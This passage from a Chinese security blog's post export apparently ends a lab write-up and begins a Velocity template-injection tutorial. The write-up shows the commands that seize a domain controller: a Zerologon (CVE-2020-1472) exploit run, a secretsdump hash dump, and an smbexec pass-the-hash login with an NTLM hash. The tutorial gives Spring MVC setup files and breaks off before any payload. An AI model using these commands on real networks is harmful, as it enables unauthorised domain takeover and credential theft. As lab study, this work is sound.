src=\"0pCg677i6cLEu3f22OL_SfY_Ee0RjPH1yxblWo-NaF0.png\" alt=\"image\"></p>\n<p><img src=\"XM4500tDlaOVjwEcf-WxA7fVthY7epCNdiyToEE1JYc.png\" alt=\"image\"></p>\n<p><img src=\"DxJumeqo0NIv_I76J-YPhrb5WUsJd37TFZjPKsK2Uy8.png\" alt=\"image\"></p>\n<p>判断出是有域的，且为scaner.sec，域控名称为ad.scaner.sec</p>\n<p>查看系统信息</p>\n<p><img src=\"XM4500tDlaOVjwEcf-WxA7fVthY7epCNdiyToEE1JYc.png\" alt=\"image\"></p>\n<p>arp -a</p>\n<p><img src=\"o1r7TvvmDGhrfiu3GgCIL9hwAHzpKaKs0yO6ITa36OA.png\" alt=\"image\"></p>\n<p>查看用户信息，没发现域用户</p>\n<p><img src=\"vvjP-3rte4i5egKEKwDpGFMogGF-ohOYSL2uiamslcQ.png\" alt=\"image\"></p>\n<p>也没有域用户的进程</p>\n<p><img src=\"hf4SHpxlcyxWg6QKBa6JuIv6jY1mC0_-ts2elqVy5W0.png\" alt=\"image\"></p>\n<h2 id=\"cve-2020-1472拿下域控\"><a href=\"#cve-2020-1472拿下域控\" class=\"headerlink\" title=\"cve-2020-1472拿下域控\"></a>cve-2020-1472拿下域控</h2><p>分析了以下前面的信息，目前能到权限，知道域控名称和域的一些信息，但是没有拿到一个域的普通用户，这时候想起了置空漏洞，这个漏洞不需要普通的域用户就可以打。</p>\n<p>走代理打域控</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 ./cve-<span class=\"number\">2020</span>-<span class=\"number\">1472</span>-exploit.py ad <span class=\"number\">10.10</span>.<span class=\"number\">10.135</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"vlZhm2FLGS_qLHLXwAuGSuxdY--o4jIVD_nxXxi3od4.png\" alt=\"image\"></p>\n<p>发现成功了，有些惊喜，在预料之后也在预料之外</p>\n<p><img src=\"vUUw8TyUOu189TGuc8YWqP2wbVyufByk38dZZnJWP38.png\" alt=\"image\"></p>\n<h3 id=\"Impacket-secretsdump-获取域控哈希\"><a href=\"#Impacket-secretsdump-获取域控哈希\" class=\"headerlink\" title=\"Impacket secretsdump 获取域控哈希\"></a>Impacket secretsdump 获取域控哈希</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 python3 secretsdump.py scaner.sec/ad\\$@<span class=\"number\">10.10</span>.<span class=\"number\">10.135</span> -just-dc -hashes :</span><br></pre></td></tr></table></figure>\n<p><img src=\"CvxJcyJU5HIFSCEbT2kSqLmUZ5A2i_7jjWIQGsXpF-k.png\" alt=\"image\"></p>\n<h3 id=\"通过-smbexec-登录域控制器\"><a href=\"#通过-smbexec-登录域控制器\" class=\"headerlink\" title=\"通过 smbexec 登录域控制器\"></a>通过 smbexec 登录域控制器</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class=\"number\">35</span>dc382e7d31f6823c2e34216d4c15cb administrator@<span class=\"number\">10.10</span>.<span class=\"number\">10.135</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"47drsqGtQDe_awys4QZYi7lg_C9dMxziC6HU56xBJwo.png\" alt=\"image\"></p>\n<p><img src=\"kJeZm6w7d-oxvFuOtMqCmyGSrX3IAR5AGXBQEzUm6pU.png\" alt=\"image\"></p>\n<p>拿到flag</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">type C:\\Users\\Administrator\\root.txt</span><br><span class=\"line\">C:\\Windows\\system32&gt;type C:\\Users\\Administrator\\root.txt</span><br><span class=\"line\">moonsec_flag&#123;moonsec-<span class=\"number\">8</span>aff4877eb76417460c0fc7f84b32566&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"UdDZbU-TmNDduh7SdqVM6tX9M8nmHhF0JkHVgAfc0fM.png\" alt=\"image\"></p>\n","categories":["实战记录"],"tags":["域控","红蓝对抗","红队打点"]},{"title":"velocity的SSTI复现与分析","url":"/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","content":"<h1 id=\"velocity的SSTI复现与分析\"><a href=\"#velocity的SSTI复现与分析\" class=\"headerlink\" title=\"velocity的SSTI复现与分析\"></a>velocity的SSTI复现与分析</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>前面我们分析过了Thymeleaf的模板注入，我们今天继续来看另外一个模板注入。</p>\n<p>Apache Velocity是一个基于Java的Web页面模版引擎，够帮我们实现页面静态化，同时它将Java代码与网页分开，并为Java Server Pages（JSP）提供了可行的替代方案。下面我们就从零开始学习复现Velocity模板注入，触发的方法主要是两种，分别使用了evaluate和merge；使用的是Spring MVC框架来整合的Velocity模板。Velocity模板也算是比较老了，目前已经逐渐被取代。</p>\n<p><em>声明：**文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</em></p>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>velocity官网：<a href=\"https://velocity.apache.org/\">https://velocity.apache.org/</a></p>\n<p>注意⚠️：</p>\n<ul>\n<li>Spring4.3之后不再直接支持velocity</li>\n<li>Spring Boot 在 2.4 版本之后不再直接支持 Velocity 模板引擎</li>\n</ul>\n<p>所以需要使用springmvc或者springboot框架来构建复现的时候需要注意版本号；这里我使用的spirngmvc来进行复现。</p>\n<p><img src=\"cHG96YcL0fg2T5GA6ep_hnGOC6FT7NwZzzYYF7FJIqg.png\" alt=\"image\"></p>\n<p>创建完毕之后，自行添加Java目录和resources目录。</p>\n<p>在resources目录里面创建；springmvc.xml文件</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xmlns:context</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xmlns:mvc</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\"></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">           http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">           http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 启用注解驱动 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">mvc:annotation-driven</span>/&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 其他配置，如扫描Controller包、静态资源等 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">&quot;com.garck3h&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 配置Velocity视图解析器 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;velocityConfig&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.springframework.web.servlet.view.velocity.VelocityConfigurer&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;resourceLoaderPath&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;/WEB-INF/views/&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;viewResolver&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.springframework.web.servlet.view.velocity.VelocityViewResolver&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;cache&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;true&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;prefix&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;suffix&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;.vm&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在web.xml里面配置</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">web-app</span> <span class=\"keyword\">PUBLIC</span></span></span><br><span class=\"line\"><span class=\"meta\"> <span class=\"string\">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\"> <span class=\"string\">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">web-app</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">display-name</span>&gt;</span>Archetype Created Web Application<span class=\"tag\">&lt;/<span class=\"name\">display-name</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>dispatcherServlet<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>contextConfigLocation<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>classpath:springmvc.xml<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>dispatcherServlet<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">web-app</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>完整的pom.xml如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">project</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">modelVersion</span>&gt;</span>4.0.0<span class=\"tag\">&lt;/<span class=\"name\">modelVersion</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.example<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>Velocity_SSTI<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.0-SNAPSHOT<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">packaging</span>&gt;</span>war<span class=\"tag\">&lt;/<span class=\"name\">packaging</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>Velocity_SSTI Maven Webapp<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- FIXME change it to the project&#x27;s website --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">url</span>&gt;</span>http://www.example.com<span class=\"tag\">&lt;/<span class=\"name\">url</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class=\"tag\">&lt;/<span class=\"name\">project.build.sourceEncoding</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">maven.compiler.source</span>&gt;</span>1.7<span class=\"tag\">&lt;/<span class=\"name\">maven.compiler.source</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">maven.compiler.target</span>&gt;</span>1.7<span class=\"tag\">&lt;/<span class=\"name\">maven.compiler.target</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- Spring MVC依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-context-support<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>4.1.5.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-webmvc<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>4.1.5.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- velocity依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.velocity<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>velocity<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.7<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.tomcat.embed<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>tomcat-embed-core<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>9.0.73<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">finalName</span>&gt;</span>Velocity_SSTI<span class=\"tag\">&lt;/<span class=\"name\">finalName</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">pluginManagement</span>&gt;</span><span class=\"comment\">&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-clean-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.1.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-resources-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.0.2<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-compiler-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.8.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-surefire-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.22.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-war-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.2.2<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-install-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.5.2<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-deploy-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.8.2<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">pluginManagement</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">project</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>在WEB-INF里面创建一个文件夹views，再在views文件夹中创建一个模板文件：hello.vm</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Hello<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Hello, $name <span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"Mk0RfqkE1_8djqCltrDnT5ZwEJpRaGFeUvDJyOdlU3o.png\" alt=\"image\"></p>\n<p>创建一个controller包之后创建一个controller控制器：MyController.java</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">package com.garck3h.controller;</span><br><span class=\"line\">/**</span><br><span class=\"line\">* Created by IntelliJ IDEA.</span><br><span class=\"line\">*</span><br><span class=\"line\">* @Author Garck3h</span><br><span class=\"line\">* @Date 2023/6/25 2:30 下午</span><br><span class=\"line\">* Life is endless, and there is no end to it.</span><br><span class=\"line\">**/</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.stereotype.Controller;</span><br><span class=\"line\">import org.springframework.ui.Model;</span><br><span class=\"line\">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class=\"line\"></span><br><span class=\"line\">@Controller</span><br><span class=\"line\">public class MyController &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @RequestMapping(&quot;/hello&quot;)</span><br><span class=\"line\">    public String demo(Model model) &#123;</span><br><span class=\"line\">        // 向模板中添加数据</span><br><span class=\"line\">        model.addAttribute(&quot;name&quot;, &quot;Hello, Velocity!&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 返回Velocity模板路径</span><br><span class=\"line\">        return &quot;hello&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"-AZ7UitZD6Nv84pI9gzw7caldSmlH3Zd80ySeXDEIdk.png\" alt=\"image\"></p>\n<p>启动tomcat进行访问：<a href=\"http://192.168.108.154:8090/hello\">http://192.168.108.154:8090/hello</a></p>\n<p><img src=\"drE0opZbun1nheG2qrLoD3gM1OlefU4yffK4mjoFMEM.png\" alt=\"image\"></p>\n<h2 id=\"常用语法\"><a href=\"#常用语法\" class=\"headerlink\" title=\"常用语法\"></a>常用语法</h2><ul>\n<li>输出变量；在模板中，$name表示一个变量，当模板被渲染时，变量会被替换为具体的值。</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">Welcome $name!</span><br></pre></td></tr></table></figure>\n<ul>\n<li>条件判断：使用#if、#else和#end语句可以进行条件判断，根据条件的真假来执行不同的操作。</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">#if($age &gt;= 18)</span><br><span class=\"line\">    You are an adult.</span><br><span class=\"line\">#else</span><br><span class=\"line\">    You are a minor.</span><br><span class=\"line\">#end</span><br></pre></td></tr></table></figure>\n<ul>\n<li>迭代循环：通过<code>#foreach</code>语句可以对集合进行迭代循环，并在每次循环中使用<code>$item</code>表示当前迭代的元素。</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">#foreach($item in $items)</span><br><span class=\"line\">    $item</span><br><span class=\"line\">#end</span><br></pre></td></tr></table></figure>\n<ul>\n<li>导入外部包：使用#import语句可以导入外部Java类，以便在模板中使用其方法和属性。</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">#import(&quot;com.example.MyClass&quot;)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>字符串拼接：可以使用#set指令将字符串赋值给变量，并通过直接引用变量进行字符串拼接。</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">#set($firstName = &quot;John&quot;)</span><br><span class=\"line\">#set($lastName = &quot;Doe&quot;)</span><br><span class=\"line\">$firstName $lastName</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>访问对象属性：</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>Name: $person.name<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>Age: $person.age<span class=\"tag\">&lt;/<span 